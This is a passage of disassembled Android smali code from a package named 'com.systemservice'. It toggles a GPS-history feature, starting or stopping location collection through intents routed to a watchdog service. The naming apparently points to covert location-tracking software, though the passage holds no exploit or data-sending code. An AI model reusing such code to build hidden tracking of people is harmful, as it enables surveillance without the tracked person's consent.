    invoke-virtual {p1, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    const-string v0, "com.sc.start.location"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-instance v0, Lcom/systemservice/a/b/a;

    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    invoke-direct {v0, v1, v1, p1}, Lcom/systemservice/a/b/a;-><init>(Ljava/lang/Object;Landroid/content/Context;Landroid/content/Intent;)V

    goto :goto_0

    :cond_0
    iget-object p1, p0, Lcom/systemservice/common/features/gpsHistory/d;->j:Lorg/apache/log4j/Logger;

    const-string v0, "is_gps_active = OFF"

    invoke-virtual {p1, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    const-string v0, "com.sc.stop.location"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    new-instance v0, Lcom/systemservice/a/b/a;

    iget-object v1, p0, Lcom/systemservice/common/features/gpsHistory/d;->p:Landroid/content/Context;

    invoke-direct {v0, v1, v1, p1}, Lcom/systemservice/a/b/a;-><init>(Ljava/lang/Object;Landroid/content/Context;Landroid/content/Intent;)V

    :goto_0
    invoke-virtual {v0}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {v0}, Lcom/systemservice/a/b/a;->b()Landroid/content/Intent;

    move-result-object v0

    invoke-static {p1, v0}, Lcom/systemservice/common/groupService/UIWatchdogService;->b(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method public e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/systemservice/common/features/gpsHistory/d;->d:[Ljava/lang/String;

    return-object v0
.end method
